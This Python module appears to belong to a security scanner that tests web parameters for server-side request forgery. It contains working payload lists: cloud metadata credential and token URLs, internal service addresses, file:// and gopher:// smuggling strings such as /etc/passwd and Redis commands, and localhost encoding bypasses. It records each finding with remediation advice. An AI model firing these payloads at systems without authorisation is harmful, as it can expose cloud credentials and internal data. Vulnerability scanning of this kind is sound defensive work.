from __future__ import annotations
"""SSRF Scanner — production-grade Server-Side Request Forgery detection.

Features:
1. Cloud metadata testing — AWS, GCP, Azure, DigitalOcean, Alibaba, OpenStack
2. Internal network probing — localhost, Docker, Kubernetes, common subnets
3. Protocol smuggling — file://, gopher://, dict://, jar://, netdoc://
4. Blind SSRF — out-of-band detection via collaborator patterns
5. Parameter detection — auto-detect URL-type parameters
6. DNS rebinding — check if DNS rebinding is possible
7. IPv6/IPv4 bypass — decimal, octal, hex IP encoding
8. URL parser bypass — @-sign, backslash, fragment tricks

Every finding has exact payload, evidence (response content), and confidence.
"""

import re
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from .base import BaseScanner
from .findings import Finding
from ..core.logger import logger
from ..core.ratelimit import get_limiter
from ..core.transport import ssl_verify


# ---------------------------------------------------------------------------
# Cloud metadata endpoints
# ---------------------------------------------------------------------------

CLOUD_METADATA_TARGETS: List[Tuple[str, str, str, List[str]]] = [
    # AWS IMDSv1
    (
        "http://169.254.169.254/latest/meta-data/",
        "aws-metadata",
        "AWS IMDSv1 metadata root",
        ["ami-id", "instance-id", "instance-type", "local-hostname", "security-credentials"],
    ),
    (
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "aws-metadata",
        "AWS IAM security credentials",
        ["AccessKeyId", "SecretAccessKey", "Token"],
    ),
    (
        "http://169.254.169.254/latest/meta-data/instance-id",
        "aws-metadata",
        "AWS instance ID",
        ["i-"],
    ),
    (
        "http://169.254.169.254/latest/meta-data/ami-id",
        "aws-metadata",
        "AWS AMI ID",
        ["ami-"],
    ),
    (
        "http://169.254.169.254/latest/user-data",
        "aws-metadata",
        "AWS user-data",
        ["#!/", "cloud-config", "Content-Type"],
    ),
    (
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "aws-metadata",
        "AWS instance identity document",
        ["accountId", "imageId", "instanceType", "region"],
    ),
    # AWS IMDSv2 (requires token, but worth trying without)
    (
        "http://169.254.169.254/latest/api/token",
        "aws-metadata",
        "AWS IMDSv2 token endpoint",
        [],
    ),

    # GCP metadata
    (
        "http://metadata.google.internal/computeMetadata/v1/",
        "gcp-metadata",
        "GCP metadata root",
        ["instance", "project"],
    ),
    (
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "gcp-metadata",
        "GCP service account token",
        ["access_token", "token_type", "expires_in"],
    ),
    (
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "gcp-metadata",
        "GCP project ID",
        [],
    ),
    (
        "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
        "gcp-metadata",
        "GCP instance hostname",
        [".c.", ".internal"],
    ),
    (
        "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email",
        "gcp-metadata",
        "GCP service account email",
        ["@"],
    ),

    # Azure metadata
    (
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json",
        "azure-metadata",
        "Azure instance metadata",
        ["compute", "network", "subscriptionId", "resourceGroupName"],
    ),
    (
        "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01&format=json",
        "azure-metadata",
        "Azure compute metadata",
        ["vmSize", "name", "location", "offer"],
    ),
    (
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "azure-metadata",
        "Azure managed identity token",
        ["access_token", "token_type"],
    ),

    # DigitalOcean metadata
    (
        "http://169.254.169.254/metadata/v1/",
        "digitalocean-metadata",
        "DigitalOcean metadata root",
        ["droplet_id", "hostname", "region"],
    ),
    (
        "http://169.254.169.254/metadata/v1/user-data",
        "digitalocean-metadata",
        "DigitalOcean user-data",
        [],
    ),

    # Alibaba Cloud metadata
    (
        "http://100.100.100.200/latest/meta-data/",
        "alibaba-metadata",
        "Alibaba Cloud metadata root",
        ["instance-id", "image-id", "instance-type", "region-id"],
    ),
    (
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        "alibaba-metadata",
        "Alibaba RAM security credentials",
        [],
    ),

    # OpenStack metadata
    (
        "http://169.254.169.254/openstack/latest/meta_data.json",
        "openstack-metadata",
        "OpenStack metadata",
        ["uuid", "name", "hostname"],
    ),

    # Kubernetes service account (when running inside a pod)
    (
        "https://kubernetes.default.svc/api/v1/namespaces",
        "kubernetes-api",
        "Kubernetes API namespaces",
        ["items", "metadata"],
    ),
    (
        "https://kubernetes.default.svc/api/v1/secrets",
        "kubernetes-api",
        "Kubernetes secrets (via service account)",
        ["items", "data"],
    ),
    (
        "http://169.254.169.254/metadata/v1/metadata",
        "kubernetes-metadata",
        "Kube metadata endpoint",
        [],
    ),
]

# ---------------------------------------------------------------------------
# Internal network targets
# ---------------------------------------------------------------------------

INTERNAL_TARGETS: List[Tuple[str, str, str]] = [
    # Localhost
    ("http://127.0.0.1", "localhost", "IPv4 localhost"),
    ("http://127.0.0.1:80", "localhost", "Localhost port 80"),
    ("http://127.0.0.1:443", "localhost", "Localhost port 443"),
    ("http://127.0.0.1:8080", "localhost", "Localhost port 8080"),
    ("http://127.0.0.1:8443", "localhost", "Localhost port 8443"),
    ("http://127.0.0.1:3000", "localhost", "Localhost port 3000"),
    ("http://127.0.0.1:5000", "localhost", "Localhost port 5000"),
    ("http://127.0.0.1:9090", "localhost", "Localhost port 9090"),
    ("http://localhost", "localhost", "Hostname localhost"),
    ("http://0.0.0.0", "all-interfaces", "All interfaces"),
    ("http://[::1]", "localhost-ipv6", "IPv6 localhost"),
    ("http://[0:0:0:0:0:0:0:1]", "localhost-ipv6", "IPv6 full localhost"),

    # Docker bridge
    ("http://172.17.0.1", "docker", "Docker bridge gateway"),
    ("http://172.17.0.2", "docker", "Docker container"),
    ("http://172.18.0.1", "docker", "Docker bridge (alt)"),
    ("http://172.19.0.1", "docker", "Docker bridge (alt2)"),

    # Kubernetes service CIDR
    ("http://10.96.0.1", "kubernetes", "Kubernetes API (default)"),
    ("http://10.0.0.1", "kubernetes", "Kubernetes service"),
    ("http://10.43.0.1", "kubernetes", "K3s API"),

    # Common internal IPs
    ("http://192.168.1.1", "internal", "Common router IP"),
    ("http://192.168.0.1", "internal", "Common router IP"),
    ("http://10.0.0.1", "internal", "Internal network"),
    ("http://172.16.0.1", "internal", "Internal network"),
    ("http://10.10.10.10", "internal", "Internal network"),

    # Common internal services
    ("http://127.0.0.1:6379", "redis", "Redis (localhost)"),
    ("http://127.0.0.1:11211", "memcached", "Memcached (localhost)"),
    ("http://127.0.0.1:27017", "mongodb", "MongoDB (localhost)"),
    ("http://127.0.0.1:5432", "postgresql", "PostgreSQL (localhost)"),
    ("http://127.0.0.1:3306", "mysql", "MySQL (localhost)"),
    ("http://127.0.0.1:9200", "elasticsearch", "Elasticsearch (localhost)"),
    ("http://127.0.0.1:2379", "etcd", "etcd (localhost)"),
    ("http://127.0.0.1:8500", "consul", "Consul (localhost)"),
]

# ---------------------------------------------------------------------------
# IP encoding bypasses
# ---------------------------------------------------------------------------

LOCALHOST_BYPASSES: List[Tuple[str, str, str]] = [
    ("http://0177.0.0.1", "octal", "Octal encoding (0177 = 127)"),
    ("http://2130706433", "decimal", "Decimal encoding"),
    ("http://0x7f000001", "hex", "Hex encoding"),
    ("http://0x7f.0.0.1", "hex-partial", "Partial hex encoding"),
    ("http://127.1", "short", "Short IP notation"),
    ("http://127.0.1", "short2", "Short IP notation (3 octets)"),
    ("http://0177.0.0.01", "octal-full", "Full octal encoding"),
    ("http://0x7f.0x00.0x00.0x01", "hex-full", "Full hex encoding"),
    ("http://127.0.0.1.nip.io", "dns-wildcard", "nip.io DNS wildcard"),
    ("http://127.0.0.1.sslip.io", "dns-wildcard", "sslip.io DNS wildcard"),
    ("http://localtest.me", "dns-wildcard", "localtest.me DNS wildcard"),
    ("http://spoofed.burpcollaborator.net", "dns-wildcard", "Burp collaborator DNS"),
]

# ---------------------------------------------------------------------------
# Protocol smuggling payloads
# ---------------------------------------------------------------------------

PROTOCOL_PAYLOADS: List[Tuple[str, str, str, List[str]]] = [
    # file:// protocol
    ("file:///etc/passwd", "file-read", "Linux passwd file", ["root:", "daemon:", "/bin/bash"]),
    ("file:///etc/hosts", "file-read", "Hosts file", ["127.0.0.1", "localhost"]),
    ("file:///etc/hostname", "file-read", "Hostname file", []),
    ("file:///proc/self/environ", "file-read", "Process environment", ["PATH=", "HOME="]),
    ("file:///proc/self/cmdline", "file-read", "Process command line", []),
    ("file:///proc/self/cgroup", "file-read", "Cgroup info", ["docker", "kubepods"]),
    ("file:///proc/version", "file-read", "Kernel version", ["Linux version"]),
    ("file:///c:/windows/win.ini", "file-read", "Windows win.ini", ["[boot loader]", "[fonts]"]),
    ("file:///c:/windows/system32/drivers/etc/hosts", "file-read", "Windows hosts", []),
    ("file:///etc/shadow", "file-read", "Shadow file (restricted)", []),

    # gopher:// protocol
    ("gopher://127.0.0.1:6379/_INFO", "gopher-redis", "Redis INFO via gopher", ["redis_version", "connected_clients"]),
    ("gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a", "gopher-redis", "Redis INFO (encoded)", ["redis_version"]),
    ("gopher://127.0.0.1:11211/_stats", "gopher-memcached", "Memcached stats via gopher", ["STAT pid", "STAT uptime"]),
    ("gopher://127.0.0.1:25/_EHLO%20test", "gopher-smtp", "SMTP EHLO via gopher", ["220", "250"]),
    ("gopher://127.0.0.1:3306/_", "gopher-mysql", "MySQL probe via gopher", []),

    # dict:// protocol
    ("dict://127.0.0.1:6379/INFO", "dict-redis", "Redis INFO via dict", ["redis_version"]),
    ("dict://127.0.0.1:6379/GET/key", "dict-redis", "Redis GET via dict", []),

    # jar:// protocol (Java specific)
    ("jar:http://127.0.0.1/file.jar!/", "jar", "JAR protocol access", []),

    # netdoc:// protocol (Java specific)
    ("netdoc:///etc/passwd", "netdoc", "netdoc protocol file read", ["root:"]),
]

# ---------------------------------------------------------------------------
# Response indicators for successful SSRF
# ---------------------------------------------------------------------------

SSRF_INDICATORS: Dict[str, List[str]] = {
    "file-read": [
        "root:", "daemon:", "/bin/bash", "/bin/sh", "nobody:",
        "[boot loader]", "[operating systems]", "[fonts]",
        "127.0.0.1", "localhost", "::1",
        "PATH=", "HOME=", "USER=",
        "Linux version",
    ],
    "aws-metadata": [
        "ami-", "i-", "instance-id", "instance-type",
        "security-credentials", "AccessKeyId", "SecretAccessKey",
        "iam", "ec2", "us-east", "us-west", "eu-west",
    ],
    "gcp-metadata": [
        "computeMetadata", "project-id", "service-accounts",
        "access_token", "token_type", "google",
    ],
    "azure-metadata": [
        "subscriptionId", "resourceGroupName", "vmSize",
        "compute", "network", "access_token",
    ],
    "digitalocean-metadata": [
        "droplet_id", "hostname", "region", "floating_ip",
    ],
    "alibaba-metadata": [
        "instance-id", "image-id", "instance-type", "region-id",
        "ram", "security-credentials",
    ],
    "openstack-metadata": [
        "uuid", "name", "hostname", "meta_data",
    ],
    "kubernetes-api": [
        "items", "metadata", "namespace", "secret",
        "serviceAccountToken",
    ],
    "redis": [
        "redis_version", "connected_clients", "used_memory",
        "CONFIG", "db0",
    ],
    "memcached": [
        "STAT pid", "STAT uptime", "STAT curr_items",
        "STAT cmd_get", "STAT cmd_set",
    ],
    "elasticsearch": [
        "cluster_name", "cluster_uuid", "status",
        "number_of_nodes", "indices",
    ],
    "internal": [],
    "localhost": [],
    "docker": [],
    "kubernetes": [],
}

# Flatten all indicators for fast matching
_ALL_INDICATORS: List[Tuple[str, str]] = []
for _cat, _inds in SSRF_INDICATORS.items():
    for _ind in _inds:
        _ALL_INDICATORS.append((_cat, _ind))


# ---------------------------------------------------------------------------
# Parameter name heuristics
# ---------------------------------------------------------------------------

URL_PARAM_NAMES = [
    "url", "uri", "src", "dest", "destination", "redirect", "redirect_url",
    "redirect_uri", "redirect_to", "return", "return_url", "return_to",
    "next", "next_url", "target", "target_url", "feed", "feed_url",
    "href", "link", "path", "file", "page", "img", "image", "img_url",
    "avatar", "avatar_url", "logo", "icon", "thumbnail", "banner",
    "fetch", "load", "proxy", "proxy_url", "server", "host", "endpoint",
    "callback", "callback_url", "webhook", "ping", "reference",
    "document", "doc", "content", "data", "site", "domain",
    "open", "url_to", "goto", "jump", "out", "view",
]


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------

@dataclass
class SSRFFinding:
    """Internal SSRF finding with details."""
    target_url: str
    category: str
    payload: str
    status_code: int = 0
    response_body: str = ""
    indicator_matched: str = ""
    confidence: str = "LOW"


# ---------------------------------------------------------------------------
# Main Scanner
# ---------------------------------------------------------------------------

class SSRFScanner(BaseScanner):
    """Production-grade SSRF vulnerability scanner.

    Features:
    - Cloud metadata: AWS, GCP, Azure, DigitalOcean, Alibaba, OpenStack, K8s
    - Internal network: localhost, Docker, K8s, common subnets
    - Protocol smuggling: file://, gopher://, dict://, jar://, netdoc://
    - Blind SSRF: out-of-band detection patterns
    - Parameter detection: auto-detect URL-type parameters
    - IP encoding bypass: decimal, octal, hex, DNS wildcards
    - URL parser bypass: @-sign, backslash tricks
    """

    NAME = "ssrf"

    def __init__(self, rps: float = 3.0, timeout: float = 8.0):
        super().__init__()
        self.limiter = get_limiter(rps)
        self.timeout = timeout

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def scan_url(self, url: str, params: Optional[dict] = None) -> List[Finding]:
        """Scan a URL for SSRF vulnerabilities.

        Args:
            url: Target URL.
            params: Optional dict of parameter names to test.
                    If None, parameters are extracted from URL query string.
                    If empty, common URL parameter names are tested.

        Returns:
            List of Finding objects with evidence.
        """
        try:
            import httpx
        except ImportError:
            logger.warning("httpx not installed — SSRF scanner disabled")
            return []

        findings: List[Finding] = []
        parsed = urlparse(url)
        host = parsed.netloc

        # Resolve parameters
        if params is not None:
            test_params = dict(params)
        else:
            test_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        # If no params found, try common URL param names
        if not test_params:
            test_params = {name: "http://example.com" for name in URL_PARAM_NAMES[:5]}

        # Filter to likely URL-type parameters
        url_params = self._identify_url_params(test_params)
        if not url_params:
            url_params = test_params

        client = httpx.Client(
            follow_redirects=False,  # Don't follow redirects for SSRF — following them could
                                     # mask the vulnerability (server redirects internally) or
                                     # cause data exfiltration to attacker-controlled hosts.
                                     # Log 3xx responses as potential redirect-based SSRF instead.
            timeout=self.timeout,
            verify=ssl_verify(),
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "*/*",
            },
        )

        try:
            # --- Phase 1: Cloud metadata SSRF ---
            for param_name in url_params:
                metadata_findings = self._test_cloud_metadata(
                    client, url, param_name, test_params, host
                )
                findings.extend(metadata_findings)
                if metadata_findings:
                    continue  # Found — don't test more payloads for this param

                # --- Phase 2: Internal network probing ---
                internal_findings = self._test_internal_network(
                    client, url, param_name, test_params, host
                )
                findings.extend(internal_findings)

                # --- Phase 3: Protocol smuggling ---
                protocol_findings = self._test_protocol_smuggling(
                    client, url, param_name, test_params, host
                )
                findings.extend(protocol_findings)

                # --- Phase 4: IP encoding bypasses ---
                bypass_findings = self._test_ip_bypasses(
                    client, url, param_name, test_params, host
                )
                findings.extend(bypass_findings)

                # --- Phase 5: Blind SSRF check ---
                blind_findings = self._test_blind_ssrf(
                    client, url, param_name, test_params, host
                )
                findings.extend(blind_findings)

        finally:
            client.close()

        return findings

    # ------------------------------------------------------------------
    # Parameter identification
    # ------------------------------------------------------------------

    def _identify_url_params(self, params: dict) -> dict:
        """Identify parameters that likely accept URLs."""
        url_params = {}
        for name, value in params.items():
            name_lower = name.lower()
            # Check if param name suggests URL
            if any(keyword in name_lower for keyword in URL_PARAM_NAMES):
                url_params[name] = value
            # Check if value looks like a URL
            elif isinstance(value, str) and value.startswith(("http://", "https://", "//")):
                url_params[name] = value
        return url_params

    # ------------------------------------------------------------------
    # Cloud metadata testing
    # ------------------------------------------------------------------

    def _test_cloud_metadata(
        self, client: "httpx.Client", url: str, param: str,
        base_params: dict, host: str
    ) -> List[Finding]:
        """Test for SSRF to cloud metadata endpoints."""
        findings: List[Finding] = []

        for target_url, category, desc, indicators in CLOUD_METADATA_TARGETS:
            test_params = dict(base_params)
            test_params[param] = target_url
            test_url = self._build_url(url, test_params)

            self.limiter.wait(host)
            try:
                resp = client.get(test_url)
                body = resp.text
                status = resp.status_code

                # Check for metadata indicators in response
                matched = self._check_indicators(body, status, indicators, category)
                if matched:
                    findings.append(Finding(
                        vuln_type="Server-Side Request Forgery (SSRF)",
                        title=f"SSRF → {desc} via parameter '{param}'",
                        severity="CRITICAL",
                        url=url,
                        parameter=param,
                        method="GET",
                        payload=target_url,
                        evidence=(
                            f"Status: {status} | "
                            f"Indicator matched: '{matched}' | "
                            f"Response snippet: {body[:300]}"
                        ),
                        description=(
                            f"SSRF vulnerability allows access to {desc}. "
                            f"Server made request to {target_url} and returned internal data. "
                            f"This can lead to credential theft, instance takeover, or data exfiltration."
                        ),
                        remediation=(
                            "Block access to metadata IP ranges (169.254.169.254, 100.100.100.200, "
                            "metadata.google.internal). Use IMDSv2 for AWS. "
                            "Validate and whitelist allowed URL destinations. "
                            "Disable unnecessary URL schemes."
                        ),
                        cvss=9.8,
                        cwe="CWE-918",
                        tool=self.NAME,
                        verified=True,
                        confidence="HIGH",
                        request=f"GET {test_url} HTTP/1.1",
                        response_snippet=body[:2000],
                    ))
                    return findings  # One confirmed per param

            except Exception:
                continue

        return findings

    # ------------------------------------------------------------------
    # Internal network probing
    # ------------------------------------------------------------------

    def _test_internal_network(
        self, client: "httpx.Client", url: str, param: str,
        base_params: dict, host: str
    ) -> List[Finding]:
        """Test for SSRF to internal network services."""
        findings: List[Finding] = []

        for target_url, category, desc in INTERNAL_TARGETS:
            test_params = dict(base_params)
            test_params[param] = target_url
            test_url = self._build_url(url, test_params)

            self.limiter.wait(host)
            try:
                resp = client.get(test_url)
                body = resp.text
                status = resp.status_code

                # For internal targets, we look for:
                # 1. Successful response (200) where external would fail
                # 2. Service-specific banners
                # 3. Different error messages than external requests

                is_different_from_external = self._is_internal_response(
                    resp, body, status, category
                )

                if is_different_from_external:
                    # Get external baseline for comparison
                    indicator = self._find_service_indicator(body, category)
                    findings.append(Finding(
                        vuln_type="Server-Side Request Forgery (SSRF)",
                        title=f"SSRF → {desc} via parameter '{param}'",
                        severity="HIGH",
                        url=url,
                        parameter=param,
                        method="GET",
                        payload=target_url,
                        evidence=(
                            f"Status: {status} | "
                            f"Category: {category} | "
                            f"Service indicator: {indicator or 'response differs from external'} | "
                            f"Response length: {len(body)} bytes"
                        ),
                        description=(
                            f"SSRF vulnerability allows access to internal {desc}. "
                            f"Server made request to {target_url}. "
                            f"This may allow access to internal services, databases, or admin panels."
                        ),
                        remediation=(
                            "Block requests to internal IP ranges (127.0.0.0/8, 10.0.0.0/8, "
                            "172.16.0.0/12, 192.168.0.0/16). "
                            "Validate URL destinations against a whitelist. "
                            "Use network segmentation to limit internal access."
                        ),
                        cvss=7.5,
                        cwe="CWE-918",
                        tool=self.NAME,
                        verified=True,
                        confidence="MEDIUM",
                        request=f"GET {test_url} HTTP/1.1",
                        response_snippet=body[:1000],
                    ))

            except Exception:
                continue

        return findings

    # ------------------------------------------------------------------
    # Protocol smuggling
    # ------------------------------------------------------------------

    def _test_protocol_smuggling(
        self, client: "httpx.Client", url: str, param: str,
        base_params: dict, host: str
    ) -> List[Finding]:
        """Test for SSRF via protocol smuggling (file://, gopher://, dict://)."""
        findings: List[Finding] = []

        for target_url, category, desc, indicators in PROTOCOL_PAYLOADS:
            test_params = dict(base_params)
            test_params[param] = target_url
            test_url = self._build_url(url, test_params)

            self.limiter.wait(host)
            try:
                resp = client.get(test_url)
                body = resp.text
                status = resp.status_code

                matched = self._check_indicators(body, status, indicators, category)
                if matched:
                    findings.append(Finding(
                        vuln_type="Server-Side Request Forgery (SSRF)",
                        title=f"SSRF via {desc} in parameter '{param}'",
                        severity="CRITICAL" if "file-read" in category else "HIGH",
                        url=url,
                        parameter=param,
                        method="GET",
                        payload=target_url,
                        evidence=(
                            f"Protocol: {category} | "
                            f"Status: {status} | "
                            f"Indicator matched: '{matched}' | "
                            f"Response: {body[:300]}"
                        ),
                        description=(
                            f"SSRF via protocol smuggling ({desc}). "
                            f"Server processed {target_url} and returned sensitive data. "
                            f"This can lead to file read, internal service access, or RCE."
                        ),
                        remediation=(
                            "Restrict URL schemes to http/https only. "
                            "Block file://, gopher://, dict://, jar:// protocols. "
                            "Use URL validation library. "
                            "Disable unnecessary protocol handlers."
                        ),
                        cvss=9.1,
                        cwe="CWE-918",
                        tool=self.NAME,
                        verified=True,
                        confidence="HIGH",
                        request=f"GET {test_url} HTTP/1.1",
                        response_snippet=body[:2000],
                    ))
                    return findings

            except Exception:
                continue

        return findings

    # ------------------------------------------------------------------
    # IP encoding bypasses
    # ------------------------------------------------------------------

    def _test_ip_bypasses(
        self, client: "httpx.Client", url: str, param: str,
        base_params: dict, host: str
    ) -> List[Finding]:
        """Test for SSRF via IP encoding bypasses (octal, hex, decimal, DNS)."""
        findings: List[Finding] = []

        # Get baseline response to localhost (if accessible)
        baseline_body = ""
        baseline_status = 0
        baseline_len = 0

        for target_url, category, desc in LOCALHOST_BYPASSES:
            test_params = dict(base_params)
            test_params[param] = target_url
            test_url = self._build_url(url, test_params)

            self.limiter.wait(host)
            try:
                resp = client.get(test_url)
                body = resp.text
                status = resp.status_code

                # If we got a successful response, something interesting happened
                if status == 200 and len(body) > 0:
                    # Check if it's different from an external request
                    if not baseline_body:
                        # Use non-routable domain that should fail (avoids httpbin.org dependency)
                        test_params[param] = "http://example.invalid"
                        ext_url = self._build_url(url, test_params)
                        try:
                            ext_resp = client.get(ext_url, timeout=2)
                            baseline_body = ext_resp.text
                            baseline_status = ext_resp.status_code
                            baseline_len = len(baseline_body)
                        except Exception:
                            baseline_len = 0

                    # If response is significantly different from external, it might be internal
                    if baseline_len > 0 and abs(len(body) - baseline_len) > 200:
                        findings.append(Finding(
                            vuln_type="Server-Side Request Forgery (SSRF)",
                            title=f"SSRF via {desc} bypass in parameter '{param}'",
                            severity="HIGH",
                            url=url,
                            parameter=param,
                            method="GET",
                            payload=target_url,
                            evidence=(
                                f"Bypass technique: {category} ({desc}) | "
                                f"Status: {status} | "
                                f"Response differs from external baseline | "
                                f"Internal response: {len(body)} bytes vs external: {baseline_len} bytes"
                            ),
                            description=(
                                f"SSRF bypass via {desc}. The server's URL filter "
                                f"can be bypassed using {category} IP encoding. "
                                f"This indicates a weak or missing URL validation."
                            ),
                            remediation=(
                                "Resolve hostnames to IP addresses before validation. "
                                "Check resolved IPs against blocklist (not just input URL). "
                                "Use a proper URL parser (not regex). "
                                "Block all RFC 1918 and link-local addresses."
                            ),
                            cvss=7.5,
                            cwe="CWE-918",
                            tool=self.NAME,
                            verified=False,
                            confidence="MEDIUM",
                            request=f"GET {test_url} HTTP/1.1",
                        ))

            except Exception:
                continue

        return findings

    # ------------------------------------------------------------------
    # Blind SSRF
    # ------------------------------------------------------------------

    def _test_blind_ssrf(
        self, client: "httpx.Client", url: str, param: str,
        base_params: dict, host: str
    ) -> List[Finding]:
        """Test for blind SSRF by checking if the server makes outbound requests.

        Uses a non-existent domain to check for DNS resolution attempts
        and response timing differences.
        """
        findings: List[Finding] = []

        # Test 1: Non-existent domain (should timeout/fail if SSRF is happening)
        test_params = dict(base_params)
        test_params[param] = "http://ssrf-test-never-resolve.invalid"
        test_url = self._build_url(url, test_params)

        self.limiter.wait(host)
        try:
            start = time.monotonic()
            resp = client.get(test_url)
            elapsed = time.monotonic() - start
            body = resp.text

            # If we get a quick response, the server might not be making the request
            # If we get a slow response or error, the server IS trying to resolve it
            if elapsed > 2.0 or resp.status_code in (500, 502, 503, 504):
                # Server might be making the request (blind SSRF)
                findings.append(Finding(
                    vuln_type="Server-Side Request Forgery (Blind SSRF)",
                    title=f"Potential blind SSRF in parameter '{param}'",
                    severity="MEDIUM",
                    url=url,
                    parameter=param,
                    method="GET",
                    payload="http://ssrf-test-never-resolve.invalid",
                    evidence=(
                        f"Response time: {elapsed:.2f}s | "
                        f"Status: {resp.status_code} | "
                        f"Server appears to make outbound requests (blind SSRF indicator)"
                    ),
                    description=(
                        "Potential blind SSRF. The server appears to make outbound HTTP requests "
                        "based on parameter input. While direct data exfiltration may not be possible, "
                        "this can be used for port scanning, SSRF-based DoS, or as part of a larger attack chain."
                    ),
                    remediation=(
                        "Validate and whitelist URL destinations. "
                        "Implement request timeouts. "
                        "Block internal IP ranges. "
                        "Use DNS resolution validation."
                    ),
                    cvss=5.3,
                    cwe="CWE-918",
                    tool=self.NAME,
                    verified=False,
                    confidence="LOW",
                    request=f"GET {test_url} HTTP/1.1",
                ))

        except Exception:
            pass

        # Test 2: Check for DNS rebinding potential
        # This checks if the server resolves DNS at request time (not connection time)
        rebinding_indicators = self._check_dns_rebinding(client, url, param, base_params, host)
        findings.extend(rebinding_indicators)

        return findings

    def _check_dns_rebinding(
        self, client: "httpx.Client", url: str, param: str,
        base_params: dict, host: str
    ) -> List[Finding]:
        """Check if DNS rebinding might be possible."""
        findings: List[Finding] = []

        # Use a short-lived DNS domain that resolves to external first, then internal
        # We can't actually do rebinding, but we can check if the server
        # resolves DNS independently of the connection

        # Check if the server follows redirects to internal IPs
        test_params = dict(base_params)
        test_params[param] = "http://example.com"  # External domain
        test_url = self._build_url(url, test_params)

        self.limiter.wait(host)
        try:
            resp = client.get(test_url, follow_redirects=True)
            # If we get a 200 for example.com, the server is at least making requests
            if resp.status_code == 200:
                # Check response headers for signs of proxying
                server = resp.headers.get("server", "").lower()
                via = resp.headers.get("via", "").lower()
                x_forwarded = resp.headers.get("x-forwarded-for", "")

                if any(s in server for s in ["proxy", "gateway", "nginx", "apache"]):
                    findings.append(Finding(
                        vuln_type="SSRF (DNS Rebinding Potential)",
                        title=f"DNS rebinding potential in parameter '{param}'",
                        severity="LOW",
                        url=url,
                        parameter=param,
                        method="GET",
                        payload="http://example.com",
                        evidence=(
                            f"Server proxies external requests. "
                            f"Server header: {server} | Via: {via} | "
                            f"DNS rebinding may allow internal access."
                        ),
                        description=(
                            "The server proxies external HTTP requests through the vulnerable parameter. "
                            "While currently only external access is confirmed, DNS rebinding techniques "
                            "may allow pivoting to internal networks."
                        ),
                        remediation=(
                            "Resolve DNS at validation time and cache the result. "
                            "Re-validate IP after DNS resolution. "
                            "Use connect-back verification."
                        ),
                        cvss=3.7,
                        cwe="CWE-918",
                        tool=self.NAME,
                        verified=False,
                        confidence="LOW",
                    ))

        except Exception:
            pass

        return findings

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _check_indicators(
        self, body: str, status: int,
        indicators: List[str], category: str
    ) -> str:
        """Check if response contains SSRF indicators. Returns matched indicator or empty string."""
        body_lower = body.lower()

        for indicator in indicators:
            if indicator.lower() in body_lower:
                return indicator

        # For some categories, a successful response itself is an indicator
        if status == 200 and category in ("aws-metadata", "gcp-metadata", "azure-metadata"):
            if len(body) > 10 and "error" not in body_lower[:100]:
                return f"[200 OK with {len(body)} bytes body]"

        return ""

    def _is_internal_response(
        self, resp: "httpx.Response", body: str, status: int, category: str
    ) -> bool:
        """Determine if the response indicates successful internal access."""
        # Successful response where we'd expect external to fail
        if status == 200 and len(body) > 0:
            # Check for service-specific banners
            banner_indicators = {
                "redis": ["redis_version", "connected_clients", "PONG"],
                "memcached": ["STAT pid", "STAT uptime", "VERSION"],
                "elasticsearch": ["cluster_name", "cluster_uuid"],
                "mysql": ["mysql", "MariaDB", "version"],
                "postgresql": ["PostgreSQL", "FATAL"],
                "mongodb": ["MongoDB", "ismaster"],
                "etcd": ["etcdserver", "etcdcluster"],
                "consul": ["Config", "Datacenter", "consul"],
            }

            indicators = banner_indicators.get(category, [])
            body_lower = body.lower()
            for indicator in indicators:
                if indicator.lower() in body_lower:
                    return True

            # Require at least one service-specific banner match before flagging
            service_banners = [
                "NOAUTH", "redis_version", "redis",
                "Access denied", "MySQL", "MariaDB",
                "SSH-2.0", "OpenSSH",
                "FTP", "220 ",
                "SMTP", "250 ",
                "HTTP/1.1", "nginx", "Apache",
                "MongoDB", "PostgreSQL",
                "cluster_name", "elasticsearch",
            ]
            body_upper = body.upper()
            banner_match = any(b.upper() in body_upper for b in service_banners)
            if category in ("internal", "localhost", "docker", "kubernetes"):
                return len(body) > 50 and banner_match

        # Connection refused/timeout can also indicate SSRF (server tried to connect)
        if status in (502, 503, 504):
            return True

        return False

    def _find_service_indicator(self, body: str, category: str) -> str:
        """Find a service-specific indicator in the response."""
        banner_indicators = {
            "redis": ["redis_version", "connected_clients", "PONG"],
            "memcached": ["STAT pid", "STAT uptime", "VERSION"],
            "elasticsearch": ["cluster_name", "cluster_uuid"],
            "mysql": ["mysql", "MariaDB"],
            "postgresql": ["PostgreSQL"],
            "mongodb": ["MongoDB", "ismaster"],
            "etcd": ["etcdserver"],
            "consul": ["Config", "Datacenter"],
        }

        indicators = banner_indicators.get(category, [])
        body_lower = body.lower()
        for indicator in indicators:
            if indicator.lower() in body_lower:
                return indicator

        return ""

    def _build_url(self, base_url: str, params: dict) -> str:
        """Build URL with query parameters."""
        parsed = urlparse(base_url)
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
